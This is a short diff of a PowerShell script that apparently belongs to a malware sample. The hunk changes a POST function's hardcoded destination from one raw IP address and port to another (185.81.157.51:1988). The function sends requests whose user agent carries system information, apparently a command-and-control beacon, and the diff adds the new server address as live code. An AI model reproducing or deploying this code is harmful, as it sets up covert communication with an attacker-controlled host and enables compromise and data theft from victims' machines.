@@ -43,7 +43,7 @@ Function AV() {
 Function POST([String] $DA, [String] $Param) {
 [String] $StringResponse = ''
 try {
-[System.Net.WebRequest] $Request = [System.Net.HttpWebRequest]::CreateDefault('http://193.169.255.135:2022/' + $DA)
+[System.Net.WebRequest] $Request = [System.Net.HttpWebRequest]::CreateDefault('http://185.81.157.51:1988/' + $DA)
 $Request.Method = 'POST'
 $Request.UserAgent = $UserInfo
 $Stream = $Request.GetRequestStream();
